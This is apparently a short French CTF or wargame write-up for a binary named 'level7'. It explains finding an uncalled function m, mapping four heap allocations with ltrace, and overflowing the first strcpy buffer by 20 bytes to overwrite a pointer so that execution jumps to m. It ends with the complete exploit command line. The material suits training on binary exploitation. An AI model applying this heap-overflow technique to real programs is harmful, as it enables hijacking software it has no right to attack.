quand on disas tout on a encore une fonction m avec comme address (0x080484f4) qui n'est pas call

avec ltrace ./level7

on voit qu'il y a 4 malloc de 8
avec comme address : 
0x0804a008 - 1
0x0804a018 - 2
0x0804a028 - 3
0x0804a038 - 4

le malloc 1 est egale au premier strcpy qu'on va overflow pour ecrire dans le malloc 3 qui sont a 20 bytes d'ecart

quand le programme va strcpy le premier argument : (python -c 'print "A" * 20 + "\x28\x99\x04\x08"') il va etre overflow de 20 et donc on va pouvoir dire a l'address du prochain malloc tu execute l'address de la fonction M donc : (python -c 'print "\xf4\x84\x04\x08"')

/level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')